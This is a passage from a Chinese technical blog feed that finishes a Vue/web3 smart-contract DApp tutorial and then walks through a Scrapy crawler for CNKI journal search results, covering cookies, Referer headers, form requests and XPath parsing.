punctuation">.</span>publicConfigStore<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">{</span>selectedAddress<span class="token punctuation">,</span> networkVersion<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'pollWeb3'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  coinbase<span class="token punctuation">:</span> selectedAddress<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>getContract.js<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">import</span> Web3 <span class="token keyword">from</span> <span class="token string">'web3'</span><span class="token keyword">import</span> <span class="token punctuation">{</span>address<span class="token punctuation">,</span> ABI<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./constant/ecourse_abi'</span><span class="token keyword">import</span> <span class="token punctuation">{</span>store<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../store/'</span><span class="token keyword">let</span> getContract <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">let</span> web3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Web3</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>web3<span class="token punctuation">.</span>currentProvider<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> ecourseContractInstance <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>Contract</span><span class="token punctuation">(</span>ABI<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//新的api</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ecourseContractInstance<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">"no contract instance build"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">resolve</span><span class="token punctuation">(</span>ecourseContractInstance<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> getContract</code></pre></li></ul><h4 id="Dapp调用合约函数"><a href="#Dapp调用合约函数" class="headerlink" title="Dapp调用合约函数"></a>Dapp调用合约函数</h4><ul><li>App.vue(我们可以在入口文件注册web3和contract)<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span>web3<span class="token punctuation">.</span>web3Instance<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'registerWeb3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'getContractInstance'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre></li><li>web3 1.0调用函数使用methods<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 为避免报错，可以在调用合约函数之前，进行一个判断</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span>contractInstance <span class="token operator">!==</span> <span class="token string">"function"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'getContractInstance'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 一个调用函数的例子</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token function">contractInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>methods<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>formInline<span class="token punctuation">.</span>balance<span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token keyword">from</span><span class="token punctuation">:</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span>web3<span class="token punctuation">.</span>coinbase<span class="token punctuation">,</span> gas<span class="token punctuation">:</span> <span class="token number">300000</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'receipt'</span><span class="token punctuation">,</span> receipt <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$message</span><span class="token punctuation">(</span><span class="token string">'取款成功'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$message</span><span class="token punctuation">(</span><span class="token string">'取款失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 另一个调用函数的例子</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token function">contractInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>methods<span class="token punctuation">.</span><span class="token function">getMemberInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token keyword">from</span><span class="token punctuation">:</span> state<span class="token punctuation">.</span>web3<span class="token punctuation">.</span>coinbase<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//注意!!!!!from不能省略，因为metamask默认的msg.sender是accounts[0]</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'account info: '</span> <span class="token operator">+</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>error <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>之前没有学习过vue项目的，可以从一个最简单的Truffle PetShop项目学起，可以很快搭建并看到一个合约怎样调用。</li><li>学习solidity的很好的网站：<a href="https://cryptozombies.io/en/course" target="_blank" rel="noopener">cryptozombies</a>，大概两天可以把所有lesson过一遍，基本上编写合约就没什么问题了</li><li>可以在<a href="https://truffleframework.com/" target="_blank" rel="noopener">truffle官网</a>上找到很多框架,直接unbox使用，不过我觉得自己配置使用起来比较容易</li></ul><hr><p>我的项目地址：<a href="https://github.com/SusieChang/ECourse" target="_blank" rel="noopener">Github</a><br>有问题，可以随时提问</p>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy实战：爬取期刊遇到的坑与技术总结</title>
      <link href="/2018/12/03/pa-qu-zhong-guo-zhi-wang-cnki-de-yu-dao-de-keng-yu-ji-zhu-zong-jie/"/>
      <url>/2018/12/03/pa-qu-zhong-guo-zhi-wang-cnki-de-yu-dao-de-keng-yu-ji-zhu-zong-jie/</url>
      
        <content type="html"><![CDATA[<h4 id="参考博客及资料"><a href="#参考博客及资料" class="headerlink" title="参考博客及资料"></a>参考博客及资料</h4><ul><li><a href="https://www.jianshu.com/p/2008701edffc" target="_blank" rel="noopener">【python2.7】爬取知网论文</a></li><li><a href="http://www.qiuqingyu.cn/2017/04/27/python%E5%AE%9E%E7%8E%B0CNKI%E7%9F%A5%E7%BD%91%E7%88%AC%E8%99%AB/" target="_blank" rel="noopener"> python实现CNKI知网爬虫</a></li><li>《Python3网络爬虫开发实战》崔庆才</li></ul><p>最近要写一个数据分析的项目，需要根据关键词爬取近十年期刊的主要信息，记录一下爬取过程中遇到的问题</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我们要爬取学术论文详情页的主题，摘要等信息，主要步骤和其他网站的爬取大致相似：一是要根据关键词搜索到列表页；二是要从列表页请求得到详情页，从详情页取得我们所要的信息。</p><ul><li>入口页面：[<a href="http://kns.cnki.net/kns/brief/default_result.aspx]" target="_blank" rel="noopener">http://kns.cnki.net/kns/brief/default_result.aspx]</a></li><li><p>搜索后，js动态渲染的请求列表页面：[<a href="http://kns.cnki.net/kns/brief/brief.aspx?...]" target="_blank" rel="noopener">http://kns.cnki.net/kns/brief/brief.aspx?...]</a><br>这里我们打开Developer Tools观察请求头和参数<br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d01a09826fd0?w=822&amp;h=515&amp;f=jpeg&amp;s=81790" alt=""><br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d0110542eda3?w=424&amp;h=257&amp;f=jpeg&amp;s=21768" alt=""><br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d01bf330ef4b?w=687&amp;h=418&amp;f=jpeg&amp;s=76510" alt=""><br>这里的关键信息： ① <strong>请求参数</strong>，我们观察到请求的关键词在字段KeyValue中(GET请求)； ② <strong>cookie</strong>和<strong>referer</strong>：如果没有在请求头部加入referer，我们将无法打开这个列表页，如果没有在头部中加入cookie，我们请求后得到的页面内容是不完整的！注意：iframe列表详情页只有从入口页面请求渲染后才能得到，这步请求不能省略！</p></li><li><p>从列表页的链接中解析得到详情页[<a href="http://kns.cnki.net/KCMS/detail/...]" target="_blank" rel="noopener">http://kns.cnki.net/KCMS/detail/...]</a><br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d09e0e75f394?w=1154&amp;h=477&amp;f=jpeg&amp;s=88213" alt=""><br>我们继续打开Developer Tools观察网页的HTML中跳转到详情页的链接<br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d0ed2a5f4ec5?w=655&amp;h=79&amp;f=jpeg&amp;s=19209" alt=""><br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d103f4b10017?w=1189&amp;h=169&amp;f=jpeg&amp;s=41839" alt=""><br>这里我们发现，链接的地址和我们最终得到的地址是不同的！是因为网页重定向了！</p></li><li><p>详情页，这里就只要解析网页即可，我们通过xpath可以很容易得到题目，作者，关键词，摘要等信息</p></li></ul><h4 id="Scrapy实战"><a href="#Scrapy实战" class="headerlink" title="Scrapy实战"></a>Scrapy实战</h4><ol><li><p>如何设置cookie：</p><ul><li>settings中设置<code>COOKIES_ENABLED=True</code>；</li><li>http请求参考<a href="https://user-gold-cdn.xitu.io/2018/12/5/1677d13f930667ab" target="_blank" rel="noopener">Scrapy - how to manage cookies/sessions</a></li><li>补充：cookiejar模块的主要作用是提供可存储的cookie对象，可以捕获cookie并在后续连接请求时重新发送，实现模拟登录功能。在scrapy中可以在请求是传入meta参数设置，根据不同会话记录对应的cookie:</li></ul></li><li><p>如何请求入口页：(CJFQ代表期刊，可根据需求更改)</p><pre class=" language-python"><code class="language-python">     data <span class="token operator">=</span> <span class="token punctuation">{</span>         <span class="token string">"txt_1_sel"</span><span class="token punctuation">:</span> <span class="token string">"SU$%=|"</span><span class="token punctuation">,</span>         <span class="token string">"txt_1_value1"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>key_word<span class="token punctuation">,</span>         <span class="token string">"txt_1_special1"</span><span class="token punctuation">:</span> <span class="token string">"%"</span><span class="token punctuation">,</span>         <span class="token string">"PageName"</span><span class="token punctuation">:</span> <span class="token string">"ASP.brief_default_result_aspx"</span><span class="token punctuation">,</span>         <span class="token string">"ConfigFile"</span><span class="token punctuation">:</span> <span class="token string">"SCDBINDEX.xml"</span><span class="token punctuation">,</span>         <span class="token string">"dbPrefix"</span><span class="token punctuation">:</span> <span class="token string">"CJFQ"</span><span class="token punctuation">,</span>         <span class="token string">"db_opt"</span><span class="token punctuation">:</span> <span class="token string">"CJFQ"</span><span class="token punctuation">,</span>         <span class="token string">"singleDB"</span><span class="token punctuation">:</span> <span class="token string">"CJFQ"</span><span class="token punctuation">,</span>         <span class="token string">"db_codes"</span><span class="token punctuation">:</span> <span class="token string">"CJFQ"</span><span class="token punctuation">,</span>         <span class="token string">"his"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>         <span class="token string">"formDefaultResult"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>         <span class="token string">"ua"</span><span class="token punctuation">:</span> <span class="token string">"1.11"</span><span class="token punctuation">,</span>         <span class="token string">"__"</span><span class="token punctuation">:</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%a %b %d %Y %H:%M:%S'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' GMT+0800 (中国标准时间)'</span>     <span class="token punctuation">}</span>     query_string <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">yield</span> Request<span class="token punctuation">(</span>url<span class="token operator">=</span>self<span class="token punctuation">.</span>home_url<span class="token operator">+</span>query_string<span class="token punctuation">,</span>                   headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>cur_referer<span class="token punctuation">}</span><span class="token punctuation">,</span>                   cookies<span class="token operator">=</span><span class="token punctuation">{</span>CookieJar<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                   callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse<span class="token punctuation">)</span></code></pre></li><li><p>如何请求列表页</p><pre class=" language-python"><code class="language-python"> <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>     data <span class="token operator">=</span> <span class="token punctuation">{</span>         <span class="token string">'pagename'</span><span class="token punctuation">:</span> <span class="token string">'ASP.brief_default_result_aspx'</span><span class="token punctuation">,</span>         <span class="token string">'dbPrefix'</span><span class="token punctuation">:</span> <span class="token string">'CJFQ'</span><span class="token punctuation">,</span>         <span class="token string">'dbCatalog'</span><span class="token punctuation">:</span> <span class="token string">'中国学术期刊网络出版总库'</span><span class="token punctuation">,</span>         <span class="token string">'ConfigFile'</span><span class="token punctuation">:</span> <span class="token string">'SCDBINDEX.xml'</span><span class="token punctuation">,</span>         <span class="token string">'research'</span><span class="token punctuation">:</span> <span class="token string">'off'</span><span class="token punctuation">,</span>         <span class="token string">'t'</span><span class="token punctuation">:</span> int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token string">'keyValue'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>key_word<span class="token punctuation">,</span>         <span class="token string">'S'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>         <span class="token string">'sorttype'</span><span class="token punctuation">:</span> <span class="token string">""</span>     <span class="token punctuation">}</span>     query_string <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>     url <span class="token operator">=</span> self<span class="token punctuation">.</span>list_url <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> query_string     <span class="token keyword">yield</span> Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>                   headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>cur_referer<span class="token punctuation">}</span><span class="token punctuation">,</span>                   callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse_list_first<span class="token punctuation">)</span></code></pre></li><li><p>如何解析列表页</p><ul><li>获得列表总页数：<pre class=" language-python"><code class="language-python">response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//span[@class="countPageMark"]/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span>max_page <span class="token operator">=</span> int<span class="token punctuation">(</span>page_link<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre></li><li>请求每个列表页<pre class=" language-python"><code class="language-python">              data <span class="token operator">=</span> <span class="token punctuation">{</span>              <span class="token string">"curpage"</span><span class="token punctuation">:</span> page_num<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#循环更改</span>              <span class="token string">"RecordsPerPage"</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>              <span class="token string">"QueryID"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>              <span class="token string">"ID"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span>              <span class="token string">"turnpage"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>              <span class="token string">"tpagemode"</span><span class="token punctuation">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>              <span class="token string">"dbPrefix"</span><span class="token punctuation">:</span> <span class="token string">"CJFQ"</span><span class="token punctuation">,</span>              <span class="token string">"Fields"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">,</span>              <span class="token string">"DisplayMode"</span><span class="token punctuation">:</span> <span class="token string">"listmode"</span><span class="token punctuation">,</span>              <span class="token string">"PageName"</span><span class="token punctuation">:</span> <span class="token string">"ASP.brief_default_result_aspx"</span><span class="token punctuation">,</span>              <span class="token string">"isinEn"</span><span class="token punctuation">:</span> <span class="token number">1</span>          <span class="token punctuation">}</span></code></pre></li><li>解析列表页（这里如果结果为空，请检查你是否正确设置了cookie）<pre class=" language-python"><code class="language-python">  tr_node <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"//tr[@bgcolor='#f6f7fb']|//tr[@bgcolor='#ffffff']"</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> item <span class="token keyword">in</span> tr_node<span class="token punctuation">:</span>      paper_link <span class="token operator">=</span> item<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"td/a[@class='fz14']/@href"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul></li><li>如何解析详情页（只是一个示例，有很多种解析方法）<pre class=" language-python"><code class="language-python"> title <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="mainArea"]/div[@class="wxmain"]/div[@class="wxTitle"]/h2/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token punctuation">)</span> author <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="mainArea"]/div[@class="wxmain"]/div[@class="wxTitle"]/div[@class="author"]/span/a/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token punctuation">)</span> abstract <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="ChDivSummary"]/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token punctuation">)</span> keywords <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="catalog_KEYWORD"]/following-sibling::*/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ol><h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><p>即使解决了cookie和referer问题，想要批量爬取还是有一定难度，主要是一个超时问题无法访问，还可能出现验证码。我尝试使用CrawlProcess分批爬取还是不能解决，可能需要改进代码。</p><p>欢迎fork<a href="https://github.com/SusieChang/ScrapySpider" target="_blank" rel="noopener">我的Github项目</a></p><h4 id="2018-12-11-更新"><a href="#2018-12-11-更新" class="headerlink" title="2018.12.11 更新"></a>2018.12.11 更新</h4><p>使用电脑端爬取经常会遇到各种问题，比如超时访问获取不到网页；使用手机知网的接口限制少点，爬取会简单一点<a href="http://wap.cnki.net/touch/web" target="_blank" rel="noopener">http://wap.cnki.net/touch/web</a>，爬取的步骤是类似的。</p><ol><li>请求列表页<br>第一步还是要观察请求，打开DevTool<br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d32a111536ce?w=1328&amp;h=308&amp;f=jpeg&amp;s=78815" alt=""><br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d32b8ee97deb?w=367&amp;h=242&amp;f=jpeg&amp;s=23327" alt=""><br>可以简单的构造第一个请求(GET)：<pre class=" language-python"><code class="language-python"> <span class="token keyword">def</span> <span class="token function">start_requests</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     data <span class="token operator">=</span> <span class="token punctuation">{</span>         <span class="token string">"kw"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>key_word<span class="token punctuation">,</span>         <span class="token string">"field"</span><span class="token punctuation">:</span><span class="token number">5</span>     <span class="token punctuation">}</span>     url <span class="token operator">=</span> self<span class="token punctuation">.</span>list_url <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>     <span class="token keyword">yield</span> Request<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>                   headers<span class="token operator">=</span>self<span class="token punctuation">.</span>header<span class="token punctuation">,</span>                   meta<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'cookiejar'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                   callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse<span class="token punctuation">)</span></code></pre></li><li>得到第一页列表页，筛选条件，得到请求的FormData<br>我们在网页进行筛选操作，可以看到类似结果：<br><img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d37f79bd54f3?w=691&amp;h=571&amp;f=jpeg&amp;s=99660" alt=""><br>FormData中，我们可以复制下来后，修改的几个变量来进行筛选：<ul><li>pageindex：第几页列表页(1 ~ )</li><li>fieldtype: 主题/篇名/全文/作者/关键词/单位/摘要/来源</li><li>sorttype: 相关度/下载次数/被引频次/最新文献/历史文献</li><li>articletype：文献类型</li><li>starttime_sc: 开始年份</li><li>endtime_sc: 结束年份<pre class=" language-python"><code class="language-python">  <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>      self<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'Referer'</span><span class="token punctuation">]</span> <span class="token operator">=</span> response<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url      <span class="token keyword">yield</span> FormRequest<span class="token punctuation">(</span>url<span class="token operator">=</span>self<span class="token punctuation">.</span>list_url<span class="token punctuation">,</span>                        headers <span class="token operator">=</span> self<span class="token punctuation">.</span>header<span class="token punctuation">,</span>                        method <span class="token operator">=</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>                        meta <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'cookiejar'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                        formdata <span class="token operator">=</span> self<span class="token punctuation">.</span>myFormData<span class="token punctuation">,</span>                        callback <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_list<span class="token punctuation">,</span>                        dont_filter <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p>解析得到总列表页数,并构造请求</p><pre class=" language-python"><code class="language-python"> <span class="token comment" spellcheck="true">#总页数</span> paper_size <span class="token operator">=</span> int<span class="token punctuation">(</span>response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="totalcount"]/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract_first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#构造请求</span> <span class="token keyword">for</span> page <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> paper_num<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>myFormData<span class="token punctuation">[</span><span class="token string">"pageindex"</span><span class="token punctuation">]</span> <span class="token operator">=</span> str<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">yield</span> FormRequest<span class="token punctuation">(</span>url<span class="token operator">=</span>self<span class="token punctuation">.</span>list_url<span class="token punctuation">,</span>                        headers <span class="token operator">=</span> self<span class="token punctuation">.</span>header<span class="token punctuation">,</span>                       method <span class="token operator">=</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>                       meta <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'cookiejar'</span><span class="token punctuation">:</span> page<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'page'</span><span class="token punctuation">:</span> page<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#更新会话</span>                       formdata <span class="token operator">=</span> self<span class="token punctuation">.</span>myFormData<span class="token punctuation">,</span>                       callback <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_list_link<span class="token punctuation">,</span>                       dont_filter <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p> 注意：我们观察请求过程，在网页中我们是通过点击更新的，我们观察LoadNextPage函数，可以看到请求更新数据也是通过提交表单的方式，因此我们可以构造POST请求数据。<br> <img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d44ed5367b8c?w=1062&amp;h=54&amp;f=jpeg&amp;s=20118" alt=""><br> <img src="https://user-gold-cdn.xitu.io/2018/12/5/1677d452acb8a46c?w=692&amp;h=481&amp;f=jpeg&amp;s=82903" alt=""></p></li><li><p>请求详情页</p><pre class=" language-python"><code class="language-python"> items <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//a[@class="c-company-top-link"]/@href'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#可以将已爬取详情页数写入文件进行记录</span>     <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'../record_page.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>         f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>response<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>     <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>         <span class="token keyword">yield</span> Request<span class="token punctuation">(</span>url <span class="token operator">=</span> item<span class="token punctuation">,</span>                       meta<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'cookiejar'</span><span class="token punctuation">:</span> response<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">'cookiejar'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#对应会话标志</span>                       headers <span class="token operator">=</span> self<span class="token punctuation">.</span>header<span class="token punctuation">,</span>                       callback <span class="token operator">=</span> self<span class="token punctuation">.</span>parse_item<span class="token 